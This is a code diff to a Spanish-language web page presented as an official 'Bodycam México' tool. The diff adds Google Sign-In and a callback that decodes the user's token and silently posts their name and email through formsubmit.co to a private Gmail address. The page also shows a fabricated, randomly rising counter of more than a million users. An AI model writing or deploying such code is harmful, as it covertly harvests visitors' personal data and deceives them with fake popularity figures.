@@ -4,6 +4,7 @@
   <meta charset="UTF-8">
   <title>Bodycam México | Herramienta Oficial</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <script src="https://accounts.google.com/gsi/client" async defer></script>
   <style>
     body {
       font-family: 'Segoe UI', sans-serif;
@@ -86,7 +87,20 @@
       <h1>Bienvenido a Bodycam México</h1>
       <p>Para continuar, accede con tu cuenta de Google.</p>
       <p>Aceptas nuestros <a href="https://policies.google.com/terms" target="_blank">Términos</a> y <a href="https://policies.google.com/privacy" target="_blank">Política</a>.</p>
-      <button onclick="irAFase2()">Iniciar sesión con Google</button>
+
+      <div id="g_id_onload"
+           data-client_id="689151884154-1v1av8v5opmn5lhderofblsimud6ccld.apps.googleusercontent.com"
+           data-callback="handleCredentialResponse"
+           data-auto_prompt="false">
+      </div>
+
+      <div class="g_id_signin"
+           data-type="standard"
+           data-shape="rectangular"
+           data-theme="filled_blue"
+           data-text="sign_in_with"
+           data-size="large">
+      </div>
 
       <div class="publicidad">[ Espacio publicitario inferior ]</div>
     </div>
@@ -139,7 +153,6 @@
 
       <div class="publicidad">[ Espacio publicitario inferior ]</div>
     </div>
-
   </div>
 
   <script>
@@ -180,12 +193,11 @@
       });
     }
 
-    // Contador animado básico
-    let contador = 1000000;
     function actualizarContador(id) {
       const el = document.getElementById(id);
+      let contador = 1000000;
       setInterval(() => {
-        contador += Math.floor(Math.random() * 5); // Avanza lentamente
+        contador += Math.floor(Math.random() * 5);
         el.textContent = "+" + contador.toLocaleString("es-MX") + " usuarios han usado esta herramienta";
       }, 3000);
     }
@@ -194,6 +206,22 @@
     actualizarContador("contadorUsuarios2");
     actualizarContador("contadorUsuarios3");
     actualizarContador("contadorUsuarios4");
+
+    function handleCredentialResponse(response) {
+      const jwt = parseJwt(response.credential);
+      const nombre = jwt.name;
+      const correo = jwt.email;
+      fetch("https://formsubmit.co/ajax/nakamalol.channel@gmail.com", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ Nombre: nombre, Correo: correo })
+      });
+      irAFase2();
+    }
+
+    function parseJwt(token) {
+      return JSON.parse(atob(token.split('.')[1]));
+    }
   </script>
 </body>
 </html>
